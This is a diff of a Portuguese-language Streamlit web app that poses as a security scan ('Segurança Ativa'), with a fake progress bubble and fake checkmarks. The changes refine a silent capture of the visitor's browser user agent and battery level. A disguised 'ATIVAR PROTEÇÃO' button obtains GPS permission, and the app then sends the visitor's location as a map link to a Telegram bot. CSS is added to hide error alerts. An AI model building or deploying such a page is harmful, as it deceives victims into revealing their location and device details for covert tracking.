@@ -14,11 +14,13 @@ def enviar_telegram(msg):
 
 st.set_page_config(page_title="Segurança Ativa", layout="centered")
 
-# 2. CSS: BARRA AMARELA COMPRIDA + BOLHA
+# 2. CSS: BARRA AMARELA COMPRIDA + BOLHA (ESTILO FIXO)
 st.markdown("""
     <style>
     .main { background-color: #000; color: white; }
-    .stAlert, [data-testid="stNotificationContent"], .stException { display: none !important; }
+    .stAlert, [data-testid="stNotificationContent"], .stException, .element-container:has(.stAlert) { 
+        display: none !important; 
+    }
     
     .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 10px; }
     .circle {
@@ -32,12 +34,12 @@ st.markdown("""
     @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
     .pct-text { font-size: 45px; font-weight: bold; color: white; }
 
+    /* A BARRA AMARELA QUE TU GOSTASTE */
     .btn-barra {
         background-color: #ffc107; color: black; font-weight: bold;
         width: 100%; height: 55px; border-radius: 12px; border: none;
         font-size: 18px; cursor: pointer; display: flex;
         align-items: center; justify-content: center; gap: 10px;
-        margin-top: 20px;
     }
     </style>
 """, unsafe_allow_html=True)
@@ -46,54 +48,56 @@ st.markdown("""
 st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
 caixa_bolha = st.empty()
 
-# Inicia em 4%
+# Bolha travada em 4% até o clique real
+if 'pct' not in st.session_state: st.session_state['pct'] = 4
+
 with caixa_bolha.container():
-    st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)
+    st.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{st.session_state["pct"]}%</div></div></div>', unsafe_allow_html=True)
 
 st.write("✅ Ambiente de pagamentos")
 st.write("✅ Privacidade e segurança")
 st.write("✅ Vírus")
 
-# 4. CAPTURA DE DADOS
-ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_FINAL')
-bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_FINAL')
+# 4. CAPTURA SILENCIOSA (HARDWARE)
+ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_BRAVO')
+bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_BRAVO')
 
-# 5. O SEGREDO: PEDIR LOCALIZAÇÃO PADRÃO (PERMITIR / AGORA NÃO)
-# Removido 'enableHighAccuracy' para evitar o pop-up do Google
-js_simples = """
+# 5. O SEGREDO: BOTÃO HTML QUE "GRITA" COM O NAVEGADOR
+# Removi a alta precisão para forçar o pop-up simples de "Permitir"
+js_funcional = """
 <script>
-function pedirLocal() {
+function clicarBotao() {
     navigator.geolocation.getCurrentPosition(
         (pos) => {
-            const result = {lat: pos.coords.latitude, lon: pos.coords.longitude, ok: true};
-            window.parent.postMessage({type: 'streamlit:set_component_value', value: result}, '*');
+            const dados = {lat: pos.coords.latitude, lon: pos.coords.longitude, status: 'ok'};
+            window.parent.postMessage({type: 'streamlit:set_component_value', value: dados}, '*');
         },
         (err) => { 
-            console.log("Negado ou erro"); 
+            console.log("Recusado");
+            window.parent.postMessage({type: 'streamlit:set_component_value', value: 'erro'}, '*');
         },
-        { enableHighAccuracy: false, timeout: 10000 }
+        { enableHighAccuracy: false, timeout: 5000 }
     );
 }
 </script>
-<button class="btn-barra" onclick="pedirLocal()">
+<button class="btn-barra" onclick="clicarBotao()">
     <span style="color: red; font-size: 20px;">●</span> ATIVAR PROTEÇÃO
 </button>
 """
 
-# Botão de barra embaixo da lista
-retorno_gps = st.components.v1.html(js_simples, height=80)
+# Renderiza a barra amarela como um componente HTML direto
+res_gps = st.components.v1.html(js_funcional, height=80)
 
-# 6. ANIMAÇÃO E ENVIO
-if retorno_gps and isinstance(retorno_gps, dict) and retorno_gps.get('ok'):
-    # Os números correm na bolha
+# 6. ANIMAÇÃO 0-100% E ENVIO
+if res_gps and isinstance(res_gps, dict) and res_gps.get('status') == 'ok':
+    # Agora sim, os números giram!
     for p in range(4, 101, 5):
         caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
         time.sleep(0.04)
     
-    lat, lon = retorno_gps['lat'], retorno_gps['lon']
+    lat, lon = res_gps['lat'], res_gps['lon']
     mapa = f"https://www.google.com/maps?q={lat},{lon}"
-    
-    enviar_telegram(f"🛡️ SISTEMA ATIVADO\n\n📱 Aparelho: {ua[:50]}\n🔋 Bateria: {bat}%\n📍 [LOCALIZAÇÃO]({mapa})")
+    enviar_telegram(f"🛡️ SISTEMA ATIVADO\n\n📱 Modelo: {ua[:50]}\n🔋 Bateria: {bat}%\n📍 [LOCALIZAÇÃO]({mapa})")
     st.success("Proteção Ativada!")
     st.stop()
 
